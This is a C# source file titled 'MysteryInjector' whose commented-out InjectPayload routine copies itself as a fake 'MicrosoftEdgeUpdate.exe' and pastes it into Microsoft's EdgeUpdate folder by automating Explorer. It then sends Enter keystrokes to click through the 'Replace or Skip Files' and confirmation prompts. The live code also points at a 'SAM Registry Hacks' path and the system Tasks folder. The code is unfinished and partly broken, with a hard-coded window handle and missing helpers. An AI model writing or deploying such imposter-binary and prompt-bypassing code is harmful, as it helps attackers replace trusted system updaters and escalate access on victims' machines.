using Registry;
namespace MysteryInjector
{
    public static class Program
    {
        public const string TakeownPath = "C:\\Windows\\System32\\Tasks";
        [System.STAThreadAttribute()]
        public static void Main()
        {
			Registry.RegistryHive registryHive = new RegistryHive("D:\\Utilities\\SAM Registry Hacks\\SAM From CMD");

            //Class: #32770 Caption: Tasks
            string explorerPath = System.Environment.GetFolderPath(System.Environment.SpecialFolder.Windows) + "\\explorer.exe";
            System.Diagnostics.Process explorer = System.Diagnostics.Process.Start(explorerPath, System.Environment.GetFolderPath(System.Environment.SpecialFolder.System) + "\\Tasks");
            explorer.WaitForInputIdle();
            while (true)
            {
                System.Threading.Thread.Sleep(1000);
                //SendReturnKeystroke();
            }
        }
        [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
        static extern void keybd_event(byte bVk, byte bScan, int dwFlags, System.IntPtr dwExtraInfo);
        private const byte VK_RETURN = 0x0D;
        public static void SendReturnKeystroke()
        {
            keybd_event(VK_RETURN, 0, 0, System.IntPtr.Zero);
            keybd_event(VK_RETURN, 0, 2, System.IntPtr.Zero);
        }
        /*
        public static void InjectPayload()
        {
            string programLocation = typeof(Program).Assembly.Location;
            string programDirectory = Path.GetDirectoryName(programLocation);
            string imposterLocation = programDirectory + "\\MicrosoftEdgeUpdate.exe";
            if (File.Exists(imposterLocation))
            {
                File.Delete(imposterLocation);
            }
            File.Copy(programLocation, imposterLocation);
            string edgeUpdatePath = $"{Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86)}\\Microsoft\\EdgeUpdate";

            Process parentExplorer = ProcessHelper.Start(new TerminalCommand($"\"C:\\Windows\\explorer.exe\" \"{Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86)}\\Microsoft\\EdgeUpdate\""));

            Thread.Sleep(1000);
            List<Process> explorers = GetExplorers();
            Process explorer = WaitForExplorerWithTitle(edgeUpdatePath);
            IntPtr shellView = Win32HandleHelper.GetChildWindowByClass(explorer.MainWindowHandle, "SHELLDLL_DefView");
            IntPtr directUI = Win32HandleHelper.GetChildWindowByClass(shellView, "DirectUIHWND");
            Thread.Sleep(1000);
            StringCollection clipboardContents = new StringCollection();
            clipboardContents.Add(imposterLocation);
            Clipboard.SetFileDropList(clipboardContents);
            explorer.WaitForInputIdle();
            WindowHandleInfo windowHandleInfo = new WindowHandleInfo(explorer.MainWindowHandle);
            var t = windowHandleInfo.GetAllChildHandles();
            PasteToExplorer((IntPtr)3343974);
            Process explorerPopup1 = WaitForExplorerWithTitle("Replace or Skip Files");
            explorer.Kill();
            Thread.Sleep(3000);
            keybd_event(VK_ENTER, 0, KEYEVENT_KEYDOWN, 0);
            keybd_event(VK_ENTER, 0, KEYEVENT_KEYUP, 0);
            Thread.Sleep(3000);
            keybd_event(VK_ENTER, 0, KEYEVENT_KEYDOWN, 0);
            keybd_event(VK_ENTER, 0, KEYEVENT_KEYUP, 0);
            Thread.Sleep(3000);
        }
        public static List<Process> GetExplorers()
        {
            List<Process> output = new List<Process>();
            foreach (Process process in Process.GetProcesses())
            {
                try
                {
                    if (process.ProcessName is "explorer")
                    {
                        output.Add(process);
                    }
                }
                catch
                {

                }
            }
            return output;
        }
        public static Process GetExplorerByTitle(string title)
        {
            Process[] processes = Process.GetProcesses();
            foreach (Process process in processes)
            {
                try
                {
                    if (process.MainModule.FileName == ExplorerFilePath)
                    {
                        if (Win32HandleHelper.GetWindowTitle(process.MainWindowHandle) == title && !process.HasExited)
                        {
                            return process;
                        }
                    }
                }
                catch
                {

                }
            }
            return null;
        }
        public static void KillAllExplorers()
        {
            Process[] processes = Process.GetProcesses();
            foreach (Process process in processes)
            {
                try
                {
                    if (process.ProcessName is "explorer")
                    {
                        process.Kill();
                    }
                }
                catch
                {

                }
            }
        }
        public static List<Process> GetChildProcesses(Process process)
        {
            List<Process> children = new List<Process>();
            ManagementObjectSearcher mos = new ManagementObjectSearcher(String.Format("Select * From Win32_Process Where ParentProcessID={0}", process.Id));

            foreach (ManagementObject mo in mos.Get())
            {
                children.Add(Process.GetProcessById(Convert.ToInt32(mo["ProcessID"])));
            }

            return children;
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct ProcessBasicInformation
        {
            public IntPtr Reserved1;
            public IntPtr PebBaseAddress;
            public IntPtr Reserved2_0;
            public IntPtr Reserved2_1;
            public IntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;
        }
        [DllImport("ntdll.dll")]
        private static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref ProcessBasicInformation processInformation, int processInformationLength, out int returnLength);
        public static IntPtr GetParentProcess(IntPtr processID)
        {
            ProcessBasicInformation output = new ProcessBasicInformation();
            int status = NtQueryInformationProcess(processID, 0, ref output, Marshal.SizeOf(output), out int returnLength);
            if (status != 0)
            {
                throw new Win32Exception(status);
            }
            return output.InheritedFromUniqueProcessId;
        }
        [DllImport("user32.dll")]
        public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
        public const uint WM_KEYDOWN = 0x100;
        public const uint WM_KEYUP = 0x0101;
        public static void PasteToExplorer(IntPtr explorerWindowHandle)
        {
            SendMessage(explorerWindowHandle, WM_KEYDOWN, (IntPtr)VK_CONTROL, IntPtr.Zero);
            SendMessage(explorerWindowHandle, WM_KEYDOWN, (IntPtr)VK_V, IntPtr.Zero);
            SendMessage(explorerWindowHandle, WM_KEYUP, (IntPtr)VK_V, IntPtr.Zero);
            SendMessage(explorerWindowHandle, WM_KEYUP, (IntPtr)VK_CONTROL, IntPtr.Zero);
        }
        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SetCursorPos(int x, int y);
        [DllImport("user32.dll", SetLastError = true)]
        static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);

        public const int KEYEVENT_KEYDOWN = 0x0000;
        public const int KEYEVENT_KEYUP = 0x0002;

        public const int VK_CONTROL = 0xA2;
        public const int VK_V = 0x56;
        public const int VK_ENTER = 0x0D;
        public static IntPtr GetPointer(object obj)
        {
            object pointerTarget = obj;
            TypedReference typedRefrence = __makeref(obj);
            IntPtr pointer;
            unsafe
            {
                pointer = **(IntPtr**)(&typedRefrence);
            }
            return pointer;
        }
        */
    }
}